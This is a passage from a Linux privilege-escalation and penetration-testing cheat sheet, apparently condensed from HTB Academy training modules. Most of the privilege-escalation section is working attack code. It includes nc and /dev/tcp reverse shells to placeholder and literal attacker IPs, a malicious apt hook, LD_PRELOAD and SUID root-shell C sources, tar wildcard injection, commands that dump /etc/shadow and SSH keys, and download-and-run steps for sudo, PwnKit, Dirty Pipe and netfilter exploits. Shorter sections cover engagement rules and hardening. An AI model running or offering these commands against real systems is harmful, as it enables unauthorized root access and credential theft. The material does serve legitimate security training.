echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

#### arua2c

```shell
aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

#### Bash Debugging Mode

- Bash <4.4

```shell
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

#### Bash Functions

- Bash <4.2-048

```shell
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```

**Capabilities**

```shell
capsh --print
/usr/sbin/getcap -r / 2>/dev/null
```

#### Credential Harvesting

```shell
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

#### find Commands

```shell
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
find / -group <GROUP> 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -writable -type d 2>/dev/null
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
```

#### iptables

#### sudo Misconfiguration Abuse

```shell
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_KEY>\n'
sudo iptables -S
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

**Kernel Exploits**

```shell
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

#### LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

#### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

#### Compiling

```shell
gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles
```

#### Privilege Escalation

```shell
sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

#### LD_LIBRARY_PATH

#### Get Information about Libraries

```shell
ldd /PATH/TO/BINARY/<BINARY>
```

**shell.c**

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

**Compiling**

```shell
gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

**Privilege Escalation**

```shell
sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

#### logrotten

> https://github.com/whotwagner/logrotten

```shell
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

#### If "create"-option is set in logrotate.cfg

```shell
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

#### If "compress"-option is set in logrotate.cfg

```shell
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

#### Path Variable Hijacking

```shell
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
```

#### PHP7.2

```shell
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

### Environment-Based Privilege Escalation

#### Path Abuse

```bash
echo $PATH

# If a privileged script or cron job calls a binary by name, place a malicious
# binary earlier in PATH or in a writable PATH directory.
PATH=.:$PATH
export PATH
```

A `sudo` entry that calls a binary by a relative name (for example `cat` instead of `/bin/cat`) can also be abused this way. Check `sudo -l` for non-absolute paths.

#### Wildcard Abuse

Example: a root cron job runs `tar` with a wildcard inside a writable directory.

```bash
# Create files whose names become tar command-line options
echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# When cron runs: tar -zcf backup.tar.gz *
sudo -l
```

The same idea applies to other tools that accept options from filenames (`rsync`, `chown`, `chmod`, etc.). Inspect the scheduled command and the tool's option parser.

#### Escaping Restricted Shells

Restricted shells (`rbash`, `rksh`, `rzsh`) limit command execution, `cd`, and environment changes. Try:

```bash
## may be via echo command
echo $(<flag.txt)

# Command substitution / injection
ls -l `pwd`
$(/bin/bash)

# Chaining
; /bin/bash
| /bin/bash
&& /bin/bash
& /bin/bash

# Environment-based escapes
export PATH=/bin:/usr/bin
BASH_ENV=/bin/bash
```

Also try shell functions, editor escapes (`vi`, `vim`), pagers (`less`, `more`), and programs that can spawn a shell (`awk`, `find`, `python`, `perl`, `ruby`, `lua`).

##### Breakout using $PATH Variable

```shell
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

##### Breakouts using less

```shell
less /etc/profile
!/bin/sh
```

```shell
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```shell
v:shell
```

##### Breakout using scp

```shell
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```

##### Breakouts using vi

```shell
vi -c ':!/bin/sh' /dev/null
```

```shell
vi
:set shell=/bin/sh
:shell
```

##### Breakouts using SSH Command Execution

```shell
ssh <USERNAME>@<RHOST> -t sh
ssh <USERNAME>@<RHOST> -t /bin/sh
ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```

##### relayd

The binary need to have the `SUID` bit set.

```shell
/usr/sbin/relayd -C /etc/shadow
```

##### Shared Library Misconfiguration

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

**shell.c**

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

**Compiling**

```shell
gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
```

##### Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for.
Instead of an option, it creates a file, named `--checkpoint=1`.

```shell
touch -- --checkpoint=1
```

```shell
touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```shell
touch -- '--checkpoint-action=exec=sh shell.sh'
```

```shell
touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```shell
rm ./'--checkpoint-action=exec=python script.sh'
```

##### Writeable Directories in Linux

```shell
/dev/shm
/tmp
```

### Permissions-Based Privilege Escalation

#### Special Permissions (SUID/SGID)

```bash
# SUID binaries owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID binaries
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Alternative enumeration
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

For each result, check [GTFOBins](https://gtfobins.github.io/) for a shell or file-read technique. Example:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### Sudo Rights Abuse

```bash
sudo -l
```

Look for `NOPASSWD`, `SETENV`, wildcards, relative paths, and commands with dangerous options. Example: `tcpdump` with `-z postrotate-command`:

```bash
# Payload executed by tcpdump as root
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f' > /tmp/.test

sudo tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Other common paths: `sudo` entries for editors, pagers, interpreters, `find`, `awk`, `tar`, `rsync`, `git`, and service restart commands. Check GTFOBins for the exact binary.

#### Privileged Groups

```bash
id
```

- **lxd** — full LXD commands are in the LXD section below.
- **docker** — equivalent to root on the host; see the Docker section.
- **disk** — raw disk access with `debugfs`:
  ```bash
  debugfs /dev/sda1
  ```
- **adm** — read logs in `/var/log`:
  ```bash
  grep -Ri "password\|passwd\|token" /var/log 2>/dev/null
  ```
- **sudo** — `sudo -l`.
- **shadow** — read `/etc/shadow` directly.

#### Capabilities

```bash
# Enumerate capabilities on common binary directories
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap -r / 2>/dev/null

# Example: cap_dac_override on vim
getcap /usr/bin/vim.basic
/usr/bin/vim.basic /etc/passwd

# Non-interactive: remove the root password field, then su without a password
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root
```

Dangerous capabilities to look for: `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_override`, `cap_sys_ptrace`, `cap_sys_module`.

For `cap_setuid` on an interpreter:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### Service-Based Privilege Escalation

#### Vulnerable Services

```bash
# Example: Screen 4.5.0
screen -v
# Search for a public exploit/PoC for the installed version
searchsploit screen 4.5.0
```

The module's Screen exploit overwrites `/etc/ld.so.preload` to load a malicious shared object as root. Only run public exploits after understanding their impact; they can crash the target.

#### Cron Job Abuse

```bash
# Find world-writable files (candidate cron scripts)
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null

# Inspect the script and its schedule
ls -la /dmz-backups/
cat /dmz-backups/backup.sh
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/

# Watch processes and file-system events without root
./pspy64 -pf -i 1000
```

If a root-owned cron script is writable, append a reverse shell (keep the original script working first):

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' >> /path/to/backup.sh
nc -lvnp 443
```

#### LXD

```bash
id    # confirm membership in the lxd group

lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

Inside the container, the host filesystem is mounted under `/mnt/root`.

#### Docker

```bash
id
docker image ls

# docker group: mount the host root filesystem
docker run -v /root:/mnt -it ubuntu

# Writable Docker socket on the host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Inside a container with a writable Docker socket and the `docker` client:

```bash
ls -al /app/docker.sock
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
```

#### Kubernetes

```bash
# API server and Kubelet discovery
curl https://<K8S_API>:6443 -k
curl https://<KUBELET>:10250/pods -k | jq .

# kubeletctl enumeration and RCE
kubeletctl -i --server <KUBELET> pods
kubeletctl -i --server <KUBELET> scan rce
kubeletctl -i --server <KUBELET> exec "id" -p <POD> -c <CONTAINER>

# Extract the service-account token and CA certificate
kubeletctl -i --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token
kubeletctl --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER> | tee -a ca.crt

# Check permissions with the stolen token
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 auth can-i --list
```

If the token can create pods, deploy a privileged pod that mounts the host root:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 get pods
```

#### Logrotate

Requirements: write access to a log file, `logrotate` running as root, and a vulnerable version (for example 3.8.6, 3.11.0, 3.15.0, 3.18.0).

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload
./logrotten -p ./payload /tmp/tmp.log
```

```bash
nc -nlvp 9001
```

#### Miscellaneous Techniques

Passive traffic capture:

```bash
sudo tcpdump -i any -A -s 0
# Analyze a capture with net-creds or PCredz
```

Weak NFS exports (`no_root_squash`):

```bash
showmount -e <TARGET>
cat /etc/exports

# On the attack host: build a SUID shell and place it on the export
cat > shell.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc shell.c -o shell

sudo mount -t nfs <TARGET>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# On the target
/tmp/shell
```

Tmux session hijacking:

```bash
ps aux | grep tmux
ls -la /shareds
tmux -S /shareds
```

### Linux Internals-Based Privilege Escalation

#### Kernel Exploits

```bash
uname -a
cat /etc/lsb-release
```

Search for the kernel version, compile a public PoC, and run it:

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

Kernel exploits can crash or destabilize the target. Prefer a PoC matching the exact kernel and distribution.

#### Shared Libraries (LD_PRELOAD)

```bash
sudo -l    # look for env_keep+=LD_PRELOAD
ldd /bin/ls
```

`root.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

#### Shared Object Hijacking

```bash
ls -la payroll
ldd payroll
readelf -d payroll | grep PATH
ls -la /development/
```

If the binary loads a library from a writable `RUNPATH` and calls a function such as `dbquery`, create a malicious library exporting that symbol:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```

#### Python Library Hijacking

```bash
sudo -l
python3 -c 'import sys; print("\n".join(sys.path))'
pip3 show psutil
ls -la /usr/lib/python3.8
```

1. **Insecure module permissions** — edit the imported function directly:
   ```python
   def virtual_memory():
       import os
       os.system('id')
       # ... original code ...
   ```
   ```bash
   sudo /usr/bin/python3 ./mem_status.py
   ```

2. **Library search path** — create a module with the same name earlier in `sys.path`:
   ```python
   # psutil.py
   import os
   def virtual_memory():
       os.system('id')
   ```
   ```bash
   sudo /usr/bin/python3 mem_status.py
   ```

3. **PYTHONPATH** — if `sudo -l` shows `SETENV`, point Python at a writable directory:
   ```bash
   sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
   ```

### Recent 0-Days

#### Sudo — CVE-2021-3156 (Baron Samedit)

```bash
sudo -V | head -n1

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 1
```

#### Sudo Policy Bypass — CVE-2019-14287

Requires a `sudoers` entry that permits a specific command for any user (`ALL=(ALL) /usr/bin/id`), and sudo below 1.8.28.

```bash
sudo -l
sudo -u#-1 id
```

#### Polkit — CVE-2021-4034 (PwnKit)

```bash
pkexec -u root id

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

#### Dirty Pipe — CVE-2022-0847

Affects Linux kernels 5.8 through 5.17.

```bash
uname -r

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

./exploit-1
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

#### Netfilter

```bash
uname -r
```

CVE-2021-22555 (kernels 2.6 – 5.11):

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

CVE-2022-25636 (kernels 5.4 – 5.6.10):

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

CVE-2023-32233 (kernels up to 6.3.1):

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

These exploits can corrupt the kernel and require a reboot. Use them only when the target matches the affected range.

### Hardening Considerations

- **Patch** kernels, `sudo`, container runtimes, and installed packages; use `unattended-upgrades` (Debian/Ubuntu) or `yum-cron` (RHEL).
- **Audit** SUID/SGID binaries, writable files, cron jobs, and library paths.
- **Use absolute paths** in `sudoers` and cron entries.
- **Do not store cleartext credentials** in world-readable files.
- **Restrict privileged groups** (`sudo`, `docker`, `lxd`, `disk`, `adm`, `shadow`).
- **Apply least privilege** to `sudo` rights and service accounts.
- **Protect custom libraries and Python modules** from low-privileged writes.
- **Remove unnecessary packages and services** to reduce attack surface.
- **Enable SELinux or AppArmor**, monitor logs, and use auditing.
- Run a baseline audit:
  ```bash
  ./lynis audit system
  ```

### Skills Assessment

The module's skills assessment is intentionally not summarized here. Complete it directly in the HTB Academy lab.

### References

- [HTB Academy — Linux Privilege Escalation](https://academy.hackthebox.com/app/module/51)
- [GTFOBins](https://gtfobins.github.io/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [pspy](https://github.com/DominicBreuker/pspy)
- [Payloads All The Things — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Linux Privilege Escalation Checklist

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems
- Look in /var/backups
- Look in /etc/fstab y en mount

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs

#### Useful commands

```
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
reset
stty size
stty -rows 48 -columns 120

echo os.system('/bin/bash')
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080; python3 -m http.server 80

# Download all files
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

#### Basic info

```
which awk perl python python3 ruby gcc cc nano vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
cat /proc/version
cat /etc/issue
cat /etc/group
cat /etc/shadow
cat /etc/crontab

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

./LinEnum.sh -t -k password
unix-privesc-check
```

**Kernel exploits**

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
```

#### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Linux
ps aux
```

#### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

#### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

#### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

#### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

#### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

#### Cronjob

Look for anything that is owned by privileged user but writable for you

```
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```
Privilege Escalation with SSH keys

```
https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
```

#### Bad path configuration

Require user interaction

#### Find plain passwords

```
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

#### Scripts

#### BASH
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> backups.sh

echo 'bash -i >& /dev/tcp/192.168.49.212/12445 0>&1' >> backups.sh
```

#### SUID

```
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");

# Compile
gcc suid.c -o suid
```

#### MSFVENOM LIBRARY Priv Esc
```
msfvenom -p linux/x64/exec -cmd '/bin/bash' -f elf-so -o libmalbec.so PrependSetuid=TRUE
```

#### PS Monitor for cron

```
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done

#PSPY32 for PS monitor
./pspy32
```

#### Linux Privesc Tools

- [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [LinuxExploitSuggester](https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

#### Linux Precompiled Exploits
- [kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)

### Post-Exploitation Loot Checklist (Linux)

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:

#### Proof
```
echo -e '\n'HOSTNAME:   && hostname && echo -e '\n'WHOAMI:   && whoami && echo -e '\n'PROOF:  && cat proof.txt && echo -e '\n'IFCONFIG:  && /sbin/ifconfig && echo -e '\n'PASSWD=<PASSWORD> cat /etc/passwd && echo -e '\n'SHADOW:  && cat /etc/shadow && echo -e '\n'NETSTAT:  && netstat -antup
```

#### Local
```
find / -type f -name local.txt 2>/dev/null

cat local.txt
```

#### Network secret

```
/root/network-secret.txt
```

#### Passwords and hashes

```
unshadow passwd shadow > unshadowed.txt
```

#### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

#### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

#### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh:
.bash_history
```

#### Databases

**SSH-Keys**

#### Browser

#### Mail

```
/var/mail
/var/spool/mail
```

#### GUI

If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

## 14. Penetration Testing Process

> Condensed from HTB Academy **Penetration Testing Process** (module 90). This is the engagement workflow and closeout checklist behind the technical sections.

### Laws & Regulations

- Obtain written authorization and a signed scope/RoE before testing.
- Follow data-protection and privacy law (GDPR, CCPA, local equivalents).
- Respect industry obligations (PCI DSS, HIPAA, ISO 27001) and client-specific policies.
- Define data handling, storage, retention, and destruction for evidence.
- Report critical/safety-impacting findings through the agreed escalation path.
- Do not test third-party or out-of-scope assets without explicit permission.

### Engagement Stages

```text
Pre-Engagement
  -> Information Gathering
  -> Vulnerability Assessment
  -> Exploitation
  -> Post-Exploitation
  -> Lateral Movement
  -> Proof-of-Concept
  -> Post-Engagement
```

#### Pre-Engagement

- Define scope, targets, exclusions, and testing windows.
- Agree on rules of engagement (RoE), emergency contacts, and escalation paths.
- Confirm authorization, contracts, and any third-party/contractor agreements.
- Hold a kick-off meeting; document assumptions and communication channels.
- Prepare infrastructure, tooling, and a secure location for evidence.

#### Information Gathering

- Open-source intelligence: employees, infrastructure, leaks, public documents.
- Infrastructure enumeration: domains, subdomains, IP ranges, cloud assets.
- Service enumeration: ports, versions, banners, exposed admin interfaces.
- Host enumeration: users, shares, local services, installed software.
- Pillaging: collect data that informs later phases without disrupting the target.

#### Vulnerability Assessment

- Research known vulnerabilities for discovered versions and configurations.
- Map possible attack vectors and rank them by likelihood and impact.
- Return to enumeration when a vector needs more detail.

#### Exploitation

- Prioritize attacks by expected impact and reliability.
- Prepare payloads, listeners, and fallback options.
- Confirm access and document every step for the report.

#### Post-Exploitation

- Evasive testing where required by the RoE.
- Local information gathering and pillaging.
- Persistence only when explicitly in scope.
- Local vulnerability assessment and privilege escalation.
- Data exfiltration only within the agreed scope.

#### Lateral Movement

- Pivot into newly reachable networks.
- Repeat evasive testing, enumeration, vulnerability assessment, exploitation, and post-exploitation on each new host.

#### Proof-of-Concept

- Demonstrate impact with the minimum necessary access.
- Capture commands, timestamps, screenshots, and evidence hashes.
- Avoid changes that are not required for the proof.

#### Post-Engagement

- Clean up shells, accounts, files, and configuration changes.
- Write the report: executive summary, technical findings, evidence, remediation.
- Hold a report review meeting and obtain deliverable acceptance.
- Offer post-remediation testing and define data-retention/close-out terms.

### Practice

- Re-run the full workflow on labs and retired boxes.
- Keep a checklist for each phase so nothing is skipped under time pressure.

## 15. Getting Started

> Condensed from HTB Academy **Getting Started** (module 77). Much of the basic tooling is already covered in sections 2–7; this section keeps the end-to-end HTB workflow and the Nibbles walkthrough.

### Setup

```bash
# Connect to the lab VPN
sudo openvpn user.ovpn

# Confirm the tunnel address and routes
ip -4 a show tun0
sudo netstat -rn

# Organize engagement files
tree Projects/
```

Use a note-taking structure per target: scans, credentials, screenshots, and findings.

### Basic Workflow

1. **Enumeration** — `nmap -sV -sC -p- <TARGET_IP>`; then inspect each open service.
2. **Web enumeration** — `whatweb`, `curl -IL`, `gobuster dir`/`dns`.
3. **Public exploits** — `searchsploit`, then validate the exploit before running it.
4. **Initial access** — reverse/bind/web shell, then stabilize the TTY.
5. **Privilege escalation** — local enumeration, `sudo -l`, SUID/SGID, kernel version.
6. **File transfer** — HTTP server, SCP, base64, or the target's native tools.

```bash
# Service and web discovery
nmap -sV -sC -p- <TARGET_IP>
nmap --script smb-os-discovery.nse -p445 <TARGET_IP>
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
whatweb <TARGET_IP>

# SMB and SNMP examples
smbclient -N -L \\\\<TARGET_IP>
smbclient -U <USER> \\\\<TARGET_IP>\\<SHARE>
snmpwalk -v 2c -c <COMMUNITY> <TARGET_IP>

# Public exploit lookup
